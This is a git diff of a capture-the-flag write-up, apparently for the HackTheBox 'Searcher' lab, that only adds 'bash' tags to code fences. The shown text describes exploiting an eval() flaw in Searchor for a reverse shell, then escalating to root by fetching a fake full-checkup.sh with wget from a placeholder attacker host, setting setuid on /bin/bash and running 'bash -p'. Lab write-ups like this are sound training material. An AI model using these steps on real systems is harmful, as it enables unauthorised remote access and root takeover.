@@ -16,7 +16,7 @@ Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python
 
 A simple google search would yield a bug that has been removed in Searchor 2.4.2+ and before that `eval()` was used in the Searchor CLI module. Assuming that the website uses that, we can send the following payload:
 
-```
+```bash
 POST /search HTTP/1.1
 Host: searcher.htb
 Content-Length: 67
@@ -38,13 +38,13 @@ This would create a reverse shell to the machine.
 
 The currently used user is `svc` upon running 
 
-```
+```bash
 $ sudo -l
 ```
 
  We can see that we can use this command:
  
-```
+```bash
 $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
 $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
 $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
@@ -52,7 +52,7 @@ $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
 
 I also discovered the `/opt/scripts` folder that had some scripts inside, including `full-checkup.sh`, I've run the command in the `/opt/scripts/` folder, and it successfully retrieved some information about the currently running services, I tried to run it in a different folder, and it gave me `Something went wrong`, I've created a dummy `full-checkup.sh` with `chmod +s /bin/bash` contents inside and ran the command again, it just printed out `[+] Done` and after that a simple `bash -p` gave me root user. 
 
-```
+```bash
 $ cd /tmp && wget http://<ip>:8000/full-checkup.sh && chmod +x ./full-checkup.sh 
 $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
 $ bash -p
